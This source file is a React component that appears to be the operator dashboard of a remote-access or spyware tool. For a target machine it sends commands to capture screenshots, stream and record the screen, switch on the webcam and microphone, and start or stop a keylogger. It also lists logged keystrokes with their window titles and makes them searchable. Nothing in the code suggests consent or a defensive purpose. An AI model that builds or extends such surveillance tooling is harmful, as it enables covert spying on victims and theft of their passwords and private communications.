import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useEffect, useState } from "react";
import ScreenshotCard from "./ScreenshotCard";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Camera,
  Keyboard,
  Video,
  Mic,
  Search,
  RefreshCw,
  Play,
  Square,
  Loader2,
} from "lucide-react";
import { dispatchCommand, waitForResult } from "@/lib/commands";
import { toast } from "sonner";

const SurveillanceTab = ({ machineId }: { machineId: string }) => {
  const queryClient = useQueryClient();
  const [screenshotLoading, setScreenshotLoading] = useState(false);
  const [keylogSearch, setKeylogSearch] = useState("");

  // Realtime subscriptions
  useEffect(() => {
    const ch1 = supabase
      .channel(`ss-${machineId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "screenshots",
          filter: `machine_id=eq.${machineId}`,
        },
        () => {
          queryClient.invalidateQueries({ queryKey: ["screenshots", machineId] });
        }
      )
      .subscribe();

    const ch2 = supabase
      .channel(`kl-${machineId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "keylogs",
          filter: `machine_id=eq.${machineId}`,
        },
        () => {
          queryClient.invalidateQueries({ queryKey: ["keylogs", machineId] });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(ch1);
      supabase.removeChannel(ch2);
    };
  }, [machineId, queryClient]);

  const { data: screenshots, isLoading: ssLoading } = useQuery({
    queryKey: ["screenshots", machineId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("screenshots")
        .select("*")
        .eq("machine_id", machineId)
        .order("created_at", { ascending: false })
        .limit(30);
      if (error) throw error;
      return data;
    },
  });

  const { data: keylogs, isLoading: klLoading } = useQuery({
    queryKey: ["keylogs", machineId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("keylogs")
        .select("*")
        .eq("machine_id", machineId)
        .order("created_at", { ascending: false })
        .limit(200);
      if (error) throw error;
      return data;
    },
  });

  const handleScreenshot = async () => {
    setScreenshotLoading(true);
    const cmdId = await dispatchCommand(machineId, "screenshot");
    if (cmdId) {
      toast.success("Screenshot requested");
      await waitForResult(cmdId, 15000);
      queryClient.invalidateQueries({ queryKey: ["screenshots", machineId] });
    }
    setScreenshotLoading(false);
  };

  const handleStartJob = async (job: string, label: string) => {
    const cmdId = await dispatchCommand(machineId, job);
    if (cmdId) toast.success(`${label} started`);
  };

  const handleStopJob = async (jobName: string) => {
    const cmdId = await dispatchCommand(machineId, "kill", { job: jobName });
    if (cmdId) toast.success(`Stopping ${jobName}`);
  };

  const filteredKeylogs = keylogs?.filter((kl) =>
    keylogSearch
      ? kl.keystrokes?.toLowerCase().includes(keylogSearch.toLowerCase()) ||
        kl.window_title?.toLowerCase().includes(keylogSearch.toLowerCase())
      : true
  );

  return (
    <Tabs defaultValue="screenshots">
      <TabsList className="bg-muted/30 border border-border/20 p-0.5">
        <TabsTrigger value="screenshots" className="gap-1.5 text-xs data-[state=active]:bg-card">
          <Camera className="w-3.5 h-3.5" /> Screenshots
        </TabsTrigger>
        <TabsTrigger value="keylogs" className="gap-1.5 text-xs data-[state=active]:bg-card">
          <Keyboard className="w-3.5 h-3.5" /> Keylogs
        </TabsTrigger>
      </TabsList>

      <TabsContent value="screenshots" className="mt-3 space-y-3">
        {/* Controls */}
        <div className="flex items-center gap-2 flex-wrap">
          <Button
            size="sm"
            className="gap-1.5 h-7 text-xs"
            onClick={handleScreenshot}
            disabled={screenshotLoading}
          >
            {screenshotLoading ? (
              <Loader2 className="w-3 h-3 animate-spin" />
            ) : (
              <Camera className="w-3 h-3" />
            )}
            Capture
          </Button>
          <Button
            size="sm"
            variant="outline"
            className="gap-1.5 h-7 text-xs"
            onClick={() => handleStartJob("screenshots", "Screenshot stream")}
          >
            <Play className="w-3 h-3" /> Stream (30s)
          </Button>
          <Button
            size="sm"
            variant="outline"
            className="gap-1.5 h-7 text-xs"
            onClick={() => handleStartJob("webcam", "Webcam capture")}
          >
            <Video className="w-3 h-3" /> Webcam
          </Button>
          <Button
            size="sm"
            variant="outline"
            className="gap-1.5 h-7 text-xs"
            onClick={() => handleStartJob("microphone", "Microphone recording")}
          >
            <Mic className="w-3 h-3" /> Microphone
          </Button>
          <Button
            size="sm"
            variant="outline"
            className="gap-1.5 h-7 text-xs"
            onClick={() => handleStartJob("recordscreen", "Screen recording")}
          >
            <Video className="w-3 h-3" /> Record Screen
          </Button>
          <div className="flex-1" />
          <Button
            size="sm"
            variant="ghost"
            className="gap-1.5 h-7 text-xs text-destructive"
            onClick={() => handleStopJob("screenshots")}
          >
            <Square className="w-3 h-3" /> Stop Stream
          </Button>
        </div>

        {/* Gallery */}
        <Card className="border-border/30">
          <CardContent className="p-3">
            {ssLoading ? (
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                {Array.from({ length: 6 }).map((_, i) => (
                  <Skeleton key={i} className="aspect-video rounded-lg" />
                ))}
              </div>
            ) : !screenshots || screenshots.length === 0 ? (
              <div className="text-center py-12">
                <Camera className="w-10 h-10 mx-auto mb-3 text-muted-foreground/20" />
                <p className="text-sm text-muted-foreground">
                  No screenshots captured yet
                </p>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {screenshots.map((ss: any) => {
                  const imgSrc = ss.storage_path
                    ? undefined
                    : ss.image_data
                    ? ss.image_data.startsWith("data:")
                      ? ss.image_data
                      : `data:image/png;base64,${ss.image_data}`
                    : undefined;

                  return (
                    <ScreenshotCard
                      key={ss.id}
                      storagePath={ss.storage_path}
                      fallbackSrc={imgSrc}
                      createdAt={ss.created_at}
                    />
                  );
                })}
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>

      <TabsContent value="keylogs" className="mt-3 space-y-3">
        {/* Controls */}
        <div className="flex items-center gap-2">
          <Button
            size="sm"
            className="gap-1.5 h-7 text-xs"
            onClick={() => handleStartJob("keycapture", "Keylogger")}
          >
            <Play className="w-3 h-3" /> Start Keylogger
          </Button>
          <Button
            size="sm"
            variant="ghost"
            className="gap-1.5 h-7 text-xs text-destructive"
            onClick={() => handleStopJob("keylogger")}
          >
            <Square className="w-3 h-3" /> Stop
          </Button>
          <div className="flex-1" />
          <div className="relative max-w-xs">
            <Search className="w-3.5 h-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground/40" />
            <Input
              placeholder="Search keystrokes..."
              value={keylogSearch}
              onChange={(e) => setKeylogSearch(e.target.value)}
              className="pl-8 h-7 text-xs"
            />
          </div>
        </div>

        <Card className="border-border/30">
          <CardContent className="p-3">
            {klLoading ? (
              <div className="space-y-2">
                {Array.from({ length: 8 }).map((_, i) => (
                  <Skeleton key={i} className="w-full h-5" />
                ))}
              </div>
            ) : !filteredKeylogs || filteredKeylogs.length === 0 ? (
              <div className="text-center py-12">
                <Keyboard className="w-10 h-10 mx-auto mb-3 text-muted-foreground/20" />
                <p className="text-sm text-muted-foreground">
                  No keylogs recorded yet
                </p>
              </div>
            ) : (
              <div className="max-h-[500px] overflow-auto font-mono text-xs space-y-1">
                {filteredKeylogs.map((kl) => (
                  <div
                    key={kl.id}
                    className="flex gap-2 py-0.5 hover:bg-muted/20 px-2 rounded"
                  >
                    <span className="text-muted-foreground/50 flex-shrink-0 w-16">
                      {new Date(kl.created_at).toLocaleTimeString()}
                    </span>
                    {kl.window_title && (
                      <Badge
                        variant="secondary"
                        className="text-[9px] bg-primary/10 text-primary border-0 flex-shrink-0 h-4"
                      >
                        {kl.window_title.length > 30
                          ? kl.window_title.slice(0, 30) + "..."
                          : kl.window_title}
                      </Badge>
                    )}
                    <span className="text-foreground break-all">
                      {kl.keystrokes}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>
    </Tabs>
  );
};

export default SurveillanceTab;
